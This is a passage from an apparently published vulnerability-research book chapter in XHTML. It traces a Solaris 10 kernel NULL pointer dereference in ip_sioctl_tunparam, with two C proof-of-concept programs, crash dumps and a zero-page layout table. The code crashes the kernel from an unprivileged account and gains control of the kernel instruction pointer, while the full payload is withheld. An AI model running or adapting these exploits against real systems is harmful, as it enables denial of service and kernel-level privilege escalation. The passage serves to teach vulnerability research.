+&gt; <strong class="userinput"><code>::msgbuf</code></strong>
+[..]
+panic[cpu0]/thread=ffffffff8816c120:
+BAD TRAP: type=e (#pf Page fault) rp=fffffe800029f530
+ <strong class="userinput"><code>addr=41414141</code></strong> occurred in module
+ "&lt;unknown&gt;" due to an illegal access to a user address
+
+
+poc2:
+#pf Page fault
+<strong class="userinput"><code>Bad kernel fault at addr=0x41414141</code></strong>
+pid=1404, <strong class="userinput"><code>pc=0x41414141</code></strong>, sp=0xfffffe800029f628, eflags=0x10246
+cr0: 80050033&lt;pg,wp,ne,et,mp,pe&gt; cr4: 6b0&lt;xmme,fxsr,pge,pae,pse&gt;
+cr2: 41414141 cr3: 1782a000 cr8: c
+        rdi:               28 rsi: ffffffff81700380 rdx: ffffffff8816c120
+        rcx:                0  r8:                0  r9:                0
+        rax:                0 rbx:                0 rbp: fffffe800029f680
+        r10:                1 r11:                0 r12:              7d0
+        r13:               28 r14: ffffffff81700380 r15:                0
+        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0
+         es:                0  fs:              1bb  gs:                0
+        trp:                e err:               10 <strong class="userinput"><code>rip:         41414141</code></strong>
+         cs:               28 rfl:            10246 rsp: fffffe800029f628
+         ss:               30
+
+fffffe800029f440 unix:die+da ()
+fffffe800029f520 unix:trap+5e6 ()
+fffffe800029f530 unix:_cmntrap+140 ()
+<strong class="userinput"><code>fffffe800029f680 41414141 ()</code></strong>
+fffffe800029f6d0 ip:ip_sioctl_tunparam+ee ()
+fffffe800029f780 ip:ip_process_ioctl+280 ()
+fffffe800029f820 ip:ip_wput_nondata+970 ()
+fffffe800029f910 ip:ip_output_options+537 ()
+fffffe800029f920 ip:ip_output+10 ()
+fffffe800029f940 ip:ip_wput+37 ()
+fffffe800029f9a0 unix:putnext+1f1 ()
+fffffe800029f9d0 arp:ar_wput+9d ()
+fffffe800029fa30 unix:putnext+1f1 ()
+fffffe800029fab0 genunix:strdoioctl+67b ()
+fffffe800029fdd0 genunix:strioctl+620 ()
+fffffe800029fdf0 specfs:spec_ioctl+67 ()
+fffffe800029fe20 genunix:fop_ioctl+25 ()
+fffffe800029ff00 genunix:ioctl+ac ()
+fffffe800029ff10 unix:brand_sys_syscall+21d ()
+
+syncing file systems...
+ done
+dumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel
+
+<strong class="userinput"><code>&gt; $c</code></strong>
+<strong class="userinput"><code>0x41414141()</code></strong>
+ip_sioctl_tunparam+0xee()
+ip_process_ioctl+0x280()
+ip_wput_nondata+0x970()
+ip_output_options+0x537()
+ip_output+0x10()
+ip_wput+0x37()
+putnext+0x1f1()
+ar_wput+0x9d()
+putnext+0x1f1()
+strdoioctl+0x67b()
+strioctl+0x620()
+spec_ioctl+0x67()
+fop_ioctl+0x25()
+ioctl+0xac()
+sys_syscall+0x17b()</pre><p>This time, the system crashed as the kernel tried to execute code at address <code class="literal">0x41414141</code> (the value of the <code class="literal">RIP</code> register, as shown in bold in the debugger output above). That means I had managed to gain full control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.<a id="IDX-CHP-3-0019" class="indexterm"/></p><p>With the right exploit payload, this bug can be used to escape from a restricted, non-global Solaris Zone and then gain superuser privileges in the global zone.</p><p>Because of the strict laws in my home country, I am not allowed to provide you with a full working exploit. However, if you are interested, you can go to the book’s website to watch a video I recorded that shows the exploit in action.<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-12" class="footnoteref">34</a>]</sup></p></div></div></body></html>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>3.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="3.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id1"/>3.2 Exploitation</h1></div></div></div><p>Exploiting this bug was an exciting challenge. NULL pointer dereferences are usually labeled as unexploitable bugs because they can generally be used for a denial-of-service attack but not for arbitrary code execution. However, this NULL pointer dereference is different, as it can be successfully exploited for arbitrary code execution at the kernel level.</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The platform that I used throughout this section was the default installation of Solaris 10 10/08 x86/x64 DVD Full Image (sol-10-u6-ga1-x86-dvd.iso), which is called Solaris 10 Generic_137138-09</em></span>.</p></div><p>To exploit the vulnerability, I performed the following steps:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Trigger the NULL pointer dereference for a denial of service.</p></li><li class="listitem"><p>Use the zero page to get control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.</p></li></ol></div><div class="sect2" title="Step 1: Trigger the NULL Pointer Dereference for a Denial of Service"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_trigger_the_null_pointer_de"/>Step 1: Trigger the NULL Pointer Dereference for a Denial of Service</h2></div></div></div><p>To trigger the NULL pointer dereference, I wrote the following proof-of-concept (POC) code (see <a class="xref" href="ch03s02.html#proof-of-concept_code" title="Example 3-1. Proof-of-concept code (poc.c) that I wrote to trigger the NULL pointer dereference bug I found in Solaris">Example 3-1</a>).</p><div class="example"><a id="proof-of-concept_code"/><p class="title">Example 3-1. Proof-of-concept code (<span class="emphasis"><em>poc.c</em></span>) that I wrote to trigger the NULL pointer dereference bug I found in Solaris</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
+02    #include &lt;fcntl.h&gt;
+03    #include &lt;sys/syscall.h&gt;
+04    #include &lt;errno.h&gt;
+05    #include &lt;sys/sockio.h&gt;
+06    #include &lt;net/if.h&gt;
+07
+08    int
+09    main (void)
+10    {
+11           int       fd  = 0;
+12           char      data[32];
+13
+14           fd = open ("/dev/arp", O_RDWR);
+15
+16           if (fd &lt; 0) {
+17                   perror ("open");
+18                   return 1;
+19           }
+20
+21           // IOCTL data (interface name with invalid alias ":01")
+22           data[0] = 0x3a; // colon
+23           data[1] = 0x30; // ASCII zero
+24           data[2] = 0x31; // digit 1
+25           data[3] = 0x00; // NULL termination
+26
+27           // IOCTL call
+28           syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);
+29
+30           printf ("poc failed\n");
+31           close (fd);
+32
+33           return 0;
+34    }</pre></div></div><p>The POC code first opens the kernel network device <code class="literal">/dev/arp</code> (see line 14). Note that the devices <code class="literal">/dev/tcp</code> and <code class="literal">/dev/udp</code> also support the <code class="literal">SIOCGTUNPARAM</code> IOCTL and could therefore be used instead of <code class="literal">/dev/arp</code>. Next, the IOCTL data is prepared (see lines 22–25). The data consists of an interface name with invalid alias <code class="literal">:01</code> to trigger the bug. Finally the <code class="literal">SIOCGTUNPARAM</code> IOCTL is called and the IOCTL data is sent to the kernel (see line 28).</p><p>I then compiled and tested the POC code as an unprivileged user on a Solaris 10 64-bit system:</p><a id="I_programlisting3_d1e2545"/><pre class="programlisting">solaris$ <strong class="userinput"><code>isainfo -b</code></strong>
+64
+
+solaris$ <strong class="userinput"><code>id</code></strong>
+uid=100(wwwuser) gid=1(other)
+
+solaris$ <strong class="userinput"><code>uname -a</code></strong>
+SunOS bob 5.10 Generic_137138-09 i86pc i386 i86pc
+
+solaris$ <strong class="userinput"><code>/usr/sfw/bin/gcc -m64 -o poc poc.c</code></strong>
+
+solaris$ <strong class="userinput"><code>./poc</code></strong></pre><p>The system crashed immediately and rebooted. After the reboot, I logged in as root and inspected the kernel crash files with the help of Solaris Modular Debugger (mdb)<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-8" class="footnoteref">30</a>]</sup> (see Section B.1 for a description of the following debugger commands):<a id="IDX-CHP-3-0009" class="indexterm"/><a id="IDX-CHP-3-0010" class="indexterm"/><a id="IDX-CHP-3-0011" class="indexterm"/><a id="IDX-CHP-3-0012" class="indexterm"/></p><a id="I_programlisting3_d1e2579"/><pre class="programlisting">solaris# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(root)
+
+solaris# <strong class="userinput"><code>hostname</code></strong>
+bob
+
+solaris# <strong class="userinput"><code>cd /var/crash/bob/</code></strong>
+
+solaris# <strong class="userinput"><code>ls</code></strong>
+bounds    unix.0    vmcore.0
+
+solaris# <strong class="userinput"><code>mdb unix.0 vmcore.0</code></strong>
+Loading modules: [ unix krtld genunix specfs dtrace cpu.generic
+ uppc pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs
+ random sppp audiosup nfs ptm md cpc crypto fcip logindmux ]</pre><p>I used the <code class="literal">::msgbuf</code> debugger command to display the message buffer, including all console messages up to the kernel panic:<a id="IDX-CHP-3-0013" class="indexterm"/></p><a id="I_programlisting3_d1e2604"/><pre class="programlisting">&gt; <strong class="userinput"><code>::msgbuf</code></strong>
+[..]
+panic[cpu0]/thread=ffffffff87d143a0:
+BAD TRAP: type=e (#pf Page fault) rp=fffffe8000f7e5a0 addr=8
+ occurred in module "ip" due to a <strong class="userinput"><code>NULL pointer dereference</code></strong>
+
+poc:
+#pf Page fault
+Bad kernel fault at addr=0x8
+pid=1380, pc=0xfffffffff6314c7c, sp=0xfffffe8000f7e690, eflags=0x10282
+cr0: 80050033&lt;pg,wp,ne,et,mp,pe&gt; cr4: 6b0&lt;xmme,fxsr,pge,pae,pse&gt;
+cr2: 8 cr3: 21a2a000 cr8: c
+        rdi:                0 rsi: ffffffff86bc0700 rdx: ffffffff86bc09c8
+        rcx:                0  r8: fffffffffbd0fdf8  r9: fffffe8000f7e780
+        rax:                c rbx: ffffffff883ff200 rbp: fffffe8000f7e6d0
+        r10:                1 r11:                0 r12: ffffffff8661f380
+        <strong class="userinput"><code>r13:                0</code></strong> r14: ffffffff8661f380 r15: ffffffff819f5b40
+        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0
+         es:                0  fs:              1bb  gs:                0
+        trp:                e err:                0 <strong class="userinput"><code>rip: fffffffff6314c7c</code></strong>
+         cs:               28 rfl:            10282 rsp: fffffe8000f7e690
+         ss:               30
+
+fffffe8000f7e4b0 unix:die+da ()
+fffffe8000f7e590 unix:trap+5e6 ()
+fffffe8000f7e5a0 unix:_cmntrap+140 ()
+<strong class="userinput"><code>fffffe8000f7e6d0 ip:ip_sioctl_tunparam+5c ()</code></strong>
+fffffe8000f7e780 ip:ip_process_ioctl+280 ()
+fffffe8000f7e820 ip:ip_wput_nondata+970 ()
+fffffe8000f7e910 ip:ip_output_options+537 ()
+fffffe8000f7e920 ip:ip_output+10 ()
+fffffe8000f7e940 ip:ip_wput+37 ()
+fffffe8000f7e9a0 unix:putnext+1f1 ()
+fffffe8000f7e9d0 arp:ar_wput+9d ()
+fffffe8000f7ea30 unix:putnext+1f1 ()
+fffffe8000f7eab0 genunix:strdoioctl+67b ()
+fffffe8000f7edd0 genunix:strioctl+620 ()
+fffffe8000f7edf0 specfs:spec_ioctl+67 ()
+fffffe8000f7ee20 genunix:fop_ioctl+25 ()
+fffffe8000f7ef00 genunix:ioctl+ac ()
+fffffe8000f7ef10 unix:brand_sys_syscall+21d ()
+
+syncing file systems...
+ done
+dumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel</pre><p>The debugger output shows that the kernel panic happened due to a NULL pointer dereference at address <code class="literal">0xfffffffff6314c7c</code> (see the value of the <code class="literal">RIP</code> register). Next, I asked the debugger to display the instruction at that address:</p><a id="I_programlisting3_d1e2630"/><pre class="programlisting">&gt; <strong class="userinput"><code>0xfffffffff6314c7c::dis</code></strong>
+ip_sioctl_tunparam+0x30:        jg     +0xf0    &lt;ip_sioctl_tunparam+0x120&gt;
+ip_sioctl_tunparam+0x36:        movq   0x28(%r12),%rax
+ip_sioctl_tunparam+0x3b:        movq   0x28(%rbx),%rbx
+ip_sioctl_tunparam+0x3f:        movq   %r12,%rdi
+ip_sioctl_tunparam+0x42:        movb   $0xe,0x19(%rax)
+ip_sioctl_tunparam+0x46:        call   +0x5712cfa       &lt;copymsg&gt;
+ip_sioctl_tunparam+0x4b:        movq   %rax,%r15
+ip_sioctl_tunparam+0x4e:        movl   $0xc,%eax
+ip_sioctl_tunparam+0x53:        testq  %r15,%r15
+ip_sioctl_tunparam+0x56:        je     +0x9d    &lt;ip_sioctl_tunparam+0xf3&gt;
+<strong class="userinput"><code>ip_sioctl_tunparam+0x5c:        movq   0x8(%r13),%r14</code></strong>
+[..]</pre><p>The crash was caused by the instruction <code class="literal">movq 0x8(%r13),%r14</code> at address <code class="literal">ip_sioctl_tunparam+0x5c</code>. The instruction tried to reference the value pointed to by register <code class="literal">r13</code>. As the debugger output of the <code class="literal">::msgbuf</code> command shows, <code class="literal">r13</code> had the value 0 at the time of the crash. So the assembler instruction is equivalent to the NULL pointer dereference that happens in <code class="literal">ip_sioctl_tunparam()</code> (see line 9432 in the following code snippet).</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/inet/ip/ip_if.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">ip_sioctl_tunparam()</code></p></dd></dl></div><a id="I_programlisting3_d1e2676"/><pre class="programlisting">[..]
+9401    int
+9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,
+9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)
+9404    {
+[..]
+<strong class="userinput"><code>9432        ill = ipif-&gt;ipif_ill;</code></strong>
+[..]</pre><p>I was able to demonstrate that this bug can be successfully exploited by an unprivileged user to crash the system. Because all Solaris Zones share the same kernel, it’s also possible to crash the whole system (all zones), even if the vulnerability is triggered in an unprivileged, non-global zone (see Section C.3 for more information on the Solaris Zones technology). Any hosting provider using the Solaris Zones functionality could be greatly impacted if it were exploited by someone with malicious intent.<a id="IDX-CHP-3-0014" class="indexterm"/></p></div><div class="sect2" title="Step 2: Use the Zero Page to Get Control over EIP/RIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_use_the_zero_page_to_get_co"/>Step 2: Use the Zero Page to Get Control over EIP/RIP</h2></div></div></div><p>After I was able to crash the system, I decided to attempt arbitrary code execution. To do this, I had to solve the following two problems:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Prevent the system from crashing as the NULL pointer dereference gets triggered.</p></li><li class="listitem"><p>Take control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.</p></li></ul></div><p>The system crash is caused by the NULL pointer dereference. As the zero or NULL page is normally not mapped, the dereference leads to an access violation that crashes the system (see also Section A.2). All I had to do to prevent the system from crashing was to map the zero page before triggering the NULL pointer dereference. This can be done easily on the x86 and AMD64 architecture, because Solaris segregates the virtual address space of processes on these platforms into two parts: user space and kernel space (see <a class="xref" href="ch03s02.html#virtual_address_space_of_a_process_open" title="Figure 3-5. Virtual address space of a process (Solaris x86 64-bit)">Figure 3-5</a>). User space is where all user-mode applications run, while kernel space is where the kernel itself, as well as kernel extensions (e.g., drivers), run. However, the kernel and the user space of a process share the same zero page.<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-9" class="footnoteref">31</a>]</sup><a id="IDX-CHP-3-0015" class="indexterm"/><a id="IDX-CHP-3-0016" class="indexterm"/><a id="IDX-CHP-3-0017" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p>Each user-mode address space is unique to a particular process, while the kernel address space is shared across all processes. Mapping the NULL page in one process only causes it to be mapped in that process’s address space only.</p></div><div class="figure"><a id="virtual_address_space_of_a_process_open"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e2725"/><img src="httpatomoreillycomsourcenostarchimages939257.png.jpg" alt="Virtual address space of a process (Solaris x86 64-bit)"/></div></div><p class="title">Figure 3-5. Virtual address space of a process (Solaris x86 64-bit)<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-10" class="footnoteref">32</a>]</sup></p></div><p>By mapping the zero page before triggering the NULL pointer dereference, I was able to prevent the system from crashing. That got me to the next problem: How to gain control over <code class="literal">EIP</code>/<code class="literal">RIP</code>? The only data that was under my full control was the IOCTL data sent to the kernel and the user-space data of a process, including the zero page. The only way to get control was to make the kernel reference some data from the zero page that would later be used to control the execution flow of the kernel. I thought that approach would not work, but I was wrong.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/inet/ip/ip_if.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">ip_sioctl_tunparam()</code></p></dd></dl></div><a id="I_programlisting3_d1e2755"/><pre class="programlisting">[..]
+9401    int
+9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,
+9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)
+9404    {
+[..]
+<strong class="userinput"><code>9432        ill = ipif-&gt;ipif_ill;</code></strong>
+9433        mutex_enter(&amp;connp-&gt;conn_lock);
+9434        mutex_enter(&amp;ill-&gt;ill_lock);
+9435        if (ipip-&gt;ipi_cmd == SIOCSTUNPARAM || ipip-&gt;ipi_cmd == OSIOCSTUNPARAM) {
+9436            success = ipsq_pending_mp_add(connp, ipif, CONNP_TO_WQ(connp),
+9437                mp, 0);
+9438        } else {
+9439            success = ill_pending_mp_add(ill, connp, mp);
+9440        }
+9441        mutex_exit(&amp;ill-&gt;ill_lock);
+9442        mutex_exit(&amp;connp-&gt;conn_lock);
+9443
+9444        if (success) {
+9445            ip1dbg(("sending down tunparam request "));
+<strong class="userinput"><code>9446            putnext(ill-&gt;ill_wq, mp1);</code></strong>
+[..]</pre><p>The NULL pointer dereference happens in line 9432, when <code class="literal">ipif</code> is forced to be <code class="literal">NULL</code>. This leads to the system crash. But if the zero page is mapped before <code class="literal">NULL</code> is dereferenced, the access violation won’t be triggered, and the system won’t crash. Instead, the value of the <code class="literal">ill</code> structure is determined while referencing valid user-controlled data from the zero page. Therefore, all values of the <code class="literal">ill</code> structure can be controlled by carefully crafting the zero page data. I was pleased to find that in line 9446, the function <code class="literal">putnext()</code> is called with the user-controllable value of <code class="literal">ill-&gt;ill_wq</code> as a parameter.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/os/putnext.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">putnext()</code><sup>[<a href="ch03s05.html#ftn.CHP-3-FN-11" class="footnoteref">33</a>]</sup></p></dd></dl></div><a id="I_programlisting3_d1e2806"/><pre class="programlisting">[..]
+146    void
+<strong class="userinput"><code>147    putnext(queue_t *qp, mblk_t *mp)</code></strong>
+148    {
+[..]
+<strong class="userinput"><code>154        int        (*putproc)();</code></strong>
+[..]
+<strong class="userinput"><code>176        qp = qp-&gt;q_next;</code></strong>
+<strong class="userinput"><code>177        sq = qp-&gt;q_syncq;</code></strong>
+178        ASSERT(sq != NULL);
+179        ASSERT(MUTEX_NOT_HELD(SQLOCK(sq)));
+<strong class="userinput"><code>180        qi = qp-&gt;q_qinfo;</code></strong>
+[..]
+268        /*
+269         * We now have a claim on the syncq, we are either going to
+270         * put the message on the syncq and then drain it, or we are
+271         * going to call the putproc().
+272         */
+<strong class="userinput"><code>273        putproc = qi-&gt;qi_putp;</code></strong>
+274        if (!queued) {
+275            STR_FTEVENT_MSG(mp, fqp, FTEV_PUTNEXT, mp-&gt;b_rptr -
+276                mp-&gt;b_datap-&gt;db_base);
+<strong class="userinput"><code>277            (*putproc)(qp, mp);</code></strong>
+[..]</pre><p>The user can fully control the data of the first function parameter of <code class="literal">putnext()</code>, which means that the values of <code class="literal">qp</code>, <code class="literal">sq</code>, and <code class="literal">qi</code> can also be controlled through the data of the mapped zero page (see lines 176, 177, and 180). Furthermore, the user can control the value of the function pointer declared in line 154 (see line 273). This function pointer is then called in line 277.</p><p>So, in summary, if the data of the mapped zero page is carefully crafted, it’s possible to take control of a function pointer, thereby gaining full control over <code class="literal">EIP</code>/<code class="literal">RIP</code> and resulting in arbitrary code execution at the kernel level.</p><p>I used the following POC code to gain control over <code class="literal">EIP</code>/<code class="literal">RIP</code>:</p><div class="example"><a id="poc_code_open_parenthesis"/><p class="title">Example 3-2. POC code (<span class="emphasis"><em>poc2.c</em></span>) used to gain control of EIP/RIP and thereby achieve arbitrary code execution at the kernel.</p><div class="example-contents"><pre class="programlisting">01    #include &lt;string.h&gt;
+ 02    #include &lt;stdio.h&gt;
+ 03    #include &lt;unistd.h&gt;
+ 04    #include &lt;fcntl.h&gt;
+ 05    #include &lt;sys/syscall.h&gt;
+ 06    #include &lt;sys/sockio.h&gt;
+ 07    #include &lt;net/if.h&gt;
+ 08    #include &lt;sys/mman.h&gt;
+ 09
+ 10    ////////////////////////////////////////////////
+ 11    // Map the zero page and fill it with the
+ 12    // necessary data
+ 13    int
+ 14    map_null_page (void)
+ 15    {
+ 16      void *  mem = (void *)-1;
+ 17
+ 18      // map the zero page
+ 19      mem = mmap (NULL, PAGESIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+ 20                  MAP_FIXED|MAP_PRIVATE|MAP_ANON, −1, 0);
+ 21
+ 22      if (mem != NULL) {
+ 23        printf ("failed\n");
+ 24        fflush (0);
+ 25        perror ("[-] ERROR: mmap");
+ 26        return 1;
+ 27      }
+ 28
+ 29      // fill the zero page with zeros
+ 30      memset (mem, 0x00, PAGESIZE);
+ 31
+ 32      ////////////////////////////////////////////////
+ 33      // zero page data
+ 34
+ 35      // qi-&gt;qi_putp
+ 36      *(unsigned long long *)0x00 = 0x0000000041414141;
+ 37
+ 38      // ipif-&gt;ipif_ill
+ 39      *(unsigned long long *)0x08 = 0x0000000000000010;
+ 40
+ 41      // start of ill struct (ill-&gt;ill_ptr)
+ 42      *(unsigned long long *)0x10 = 0x0000000000000000;
+ 43
+ 44      // ill-&gt;rq
+ 45      *(unsigned long long *)0x18 = 0x0000000000000000;
+ 46
+ 47      // ill-&gt;wq (sets address for qp struct)
+ 48      *(unsigned long long *)0x20 = 0x0000000000000028;
+ 49
+ 50      // start of qp struct (qp-&gt;q_info)
+ 51      *(unsigned long long *)0x28 = 0x0000000000000000;
+ 52
+ 53      // qp-&gt;q_first
+ 54      *(unsigned long long *)0x30 = 0x0000000000000000;
+ 55
+ 56      // qp-&gt;q_last
+ 57      *(unsigned long long *)0x38 = 0x0000000000000000;
+ 58
+ 59      // qp-&gt;q_next (points to the start of qp struct)
+ 60      *(unsigned long long *)0x40 = 0x0000000000000028;
+ 61
+ 62      // qp-&gt;q_syncq
+ 63      *(unsigned long long *)0xa0 = 0x00000000000007d0;
+ 64
+ 65      return 0;
+ 66    }
+ 67
+ 68    void
+ 69    status (void)
+ 70    {
+ 71      unsigned long long  i = 0;
+ 72
+ 73      printf ("[+] PAGESIZE: %d\n", (int)PAGESIZE);
+ 74      printf ("[+] Zero page data:\n");
+ 75
+ 76      for (i = 0; i &lt;= 0x40; i += 0x8)
+ 77        printf ("... 0x%02x: 0x%016llx\n", i, *(unsigned long long*)i);
+ 78
+ 79      printf ("... 0xa0: 0x%016llx\n", *(unsigned long long*)0xa0);
+ 80
+ 81      printf ("[+] The bug will be triggered in 2 seconds..\n");
+ 82
+ 83      fflush (0);
+ 84    }
+ 85
+ 86    int
+ 87    main (void)
+ 88    {
+ 89      int   fd  = 0;
+ 90      char  data[32];
+ 91
+ 92      ////////////////////////////////////////////////
+ 93      // Opening the '/dev/arp' device
+ 94      printf ("[+] Opening '/dev/arp' device .. ");
+ 95
+ 96      fd = open ("/dev/arp", O_RDWR);
+ 97
+ 98      if (fd &lt; 0) {
+ 99        printf ("failed\n");
+100        fflush (0);
+101        perror ("[-] ERROR: open");
+102        return 1;
+103      }
+104
+105      printf ("OK\n");
+106
+107      ////////////////////////////////////////////////
+108      // Map the zero page
+109      printf ("[+] Trying to map zero page .. ");
+110
+111      if (map_null_page () == 1) {
+112        return 1;
+113      }
+114
+115      printf ("OK\n");
+116
+117      ////////////////////////////////////////////////
+118      // Status messages
+119      status ();
+120      sleep (2);
+121
+122      ////////////////////////////////////////////////
+123      // IOCTL request data (interface name with invalid alias ':01')
+124      data[0] = 0x3a; // colon
+125      data[1] = 0x30; // ASCII zero
+126      data[2] = 0x31; // the digit '1'
+127      data[3] = 0x00; // NULL termination
+128
+129      ////////////////////////////////////////////////
+130      // IOCTL request
+131      syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);
+132
+133      printf ("[-] ERROR: triggering the NULL ptr deref failed\n");
+134      close (fd);
+135
+136      return 0;
+137    }</pre></div></div><p>In line 19 of <a class="xref" href="ch03s02.html#poc_code_open_parenthesis" title="Example 3-2. POC code (poc2.c) used to gain control of EIP/RIP and thereby achieve arbitrary code execution at the kernel.">Example 3-2</a>, the zero page is mapped using <code class="literal">mmap()</code>. But the most interesting part of the POC code is the layout of the zero page data (see lines 32–63). <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a> illustrates the relevant parts of this layout.<a id="IDX-CHP-3-0018" class="indexterm"/></p><div class="figure"><a id="data_layout_of_the_zero_page"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e2883"/><img src="httpatomoreillycomsourcenostarchimages939259.png.jpg" alt="Data layout of the zero page"/></div></div><p class="title">Figure 3-6. Data layout of the zero page</p></div><p>The left-hand side of <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a> shows the offsets into the zero page. The middle lists the actual values of the zero page. The right-hand side shows the references the kernel makes into the zero page. <a class="xref" href="ch03s02.html#description_of_the_zero_page_data_layout" title="Table 3-1. Description of the Zero Page Data Layout">Table 3-1</a> describes the zero page data layout illustrated in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>.</p><div class="table"><a id="description_of_the_zero_page_data_layout"/><p class="title">Table 3-1. Description of the Zero Page Data Layout</p><div class="table-contents"><table summary="Description of the Zero Page Data Layout" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Function/Line of code</p></th><th style="text-align: left" valign="bottom"><p>Data referenced by the kernel</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">ip_sioctl_tunparam()</code></p>
+<p>9432</p></td><td style="text-align: left" valign="top"><p><code class="literal">ill = ipif-&gt; ipif_ill;</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ipif</code> is <code class="literal">NULL</code>, and the offset of <code class="literal">ipif_ill</code> within the <code class="literal">ipif</code> structure is <code class="literal">0x8</code>. Therefore, <code class="literal">ipif-&gt;ipif_ill</code> references address <code class="literal">0x8</code>. The value at address <code class="literal">0x8</code> is assigned to <code class="literal">ill</code>. So the <code class="literal">ill</code> structure starts at address <code class="literal">0x10</code> (see (1) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">ip_sioctl_tunparam()</code></p>
+<p>9446</p></td><td style="text-align: left" valign="top"><p><code class="literal">putnext(ill-&gt; ill_wq, mp1);</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">ill-&gt;ill_wq</code> is used as a parameter for <code class="literal">putnext()</code>. The offset of <code class="literal">ill_wq</code> inside the <code class="literal">ill</code> structure is <code class="literal">0x10</code>. The <code class="literal">ill</code> structure starts at address <code class="literal">0x10</code>, so <code class="literal">ill-&gt;ill_wq</code> is referenced at address <code class="literal">0x20</code>.</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>147</p></td><td style="text-align: left" valign="top"><p><code class="literal">putnext(queue_t *qp, mblk_t *mp)</code></p></td><td style="text-align: left" valign="top"><p>The address of <code class="literal">qp</code> equals the value pointed to by <code class="literal">ill-&gt;ill_wq</code>. Therefore, <code class="literal">qp</code> starts at address <code class="literal">0x28</code> (see (2) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>176</p></td><td style="text-align: left" valign="top"><p><code class="literal">qp = qp-&gt;q_next;</code></p></td><td style="text-align: left" valign="top"><p>The offset of <code class="literal">q_next</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x18</code>. Therefore, the next <code class="literal">qp</code> gets assigned the value from address <code class="literal">0x40:</code> the start address of <code class="literal">qp</code> (<code class="literal">0x28</code>) + offset of <code class="literal">q_next</code> (<code class="literal">0x18</code>). The value at address <code class="literal">0x40</code> is again <code class="literal">0x28</code>, so the next <code class="literal">qp</code> structure starts at the same address as the one before (see (3) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
